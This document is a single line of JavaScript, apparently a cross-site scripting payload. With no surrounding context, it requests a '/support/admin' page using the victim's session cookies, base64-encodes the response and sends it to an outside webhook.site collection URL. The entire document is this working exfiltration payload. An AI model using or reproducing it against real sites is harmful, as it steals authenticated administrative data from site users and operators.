fetch('/support/admin',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://webhook.site/e0174355-dac4-4eb4-b4a0-902fa58a9bf1?d='+btoa(d)))
